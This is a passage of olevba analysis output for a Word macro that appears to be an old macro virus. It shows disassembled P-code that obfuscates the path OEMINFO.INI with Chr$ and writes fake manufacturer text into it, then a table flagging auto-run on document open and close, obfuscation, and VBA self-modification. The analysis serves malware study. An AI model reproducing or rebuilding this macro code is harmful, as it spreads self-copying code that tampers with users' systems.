' 	Add 
' 	St myoem 
' Line #93:
' 	LitDI2 0x005C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x004F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St myini$ 
' Line #94:
' 	Ld myoem 
' 	Ld myini$ 
' 	Concat 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #95:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "[general]"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "Manufacturer=FS080298 CORP. 98"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Model=Son, I Love You So Much !"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "[Support Information]"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "Line1=THank`s For Looking My Wallpaper"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Line2=My Program Is Not DANGER !"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Line3=Don`t Worry !!!"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Line4="
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Line5=Do You Have Any Comments ?"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "Line6=Please Send Your Email to : fs080298@yeayea.com"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Line7=:-)"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #108:
' 	Return 
' Line #109:
' 	Label Finish 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x001E "Thank for looking my wallpaper"
' Line #113:
' 	QuoteRem 0x0000 0x0012 "Special Thank To :"
' Line #114:
' Line #115:
' 	QuoteRem 0x0000 0x002B " 08:32:498:32:49 AM AM-Thursday, 9 Dec 1999"
' Line #116:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #117:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' 	QuoteRem 0x0000 0x002B " 08:24:568:24:56 AM AM-Tuesday, 21 Dec 1999"
' Line #123:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #124:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' 	QuoteRem 0x0000 0x0026 " 06:06:3818:06:38 -÷åòâåðã, 9 ìàð 2000"
' Line #130:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #131:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' 	QuoteRem 0x0000 0x002B " 02:15:462:15:46 PM PM-Tuesday, 11 Apr 2000"
' Line #137:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #138:
' 	QuoteRem 0x0000 0x0014 " fs080298@yeayea.com"
' Line #139:
' Line #140:
' Line #141:
' Line #142:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

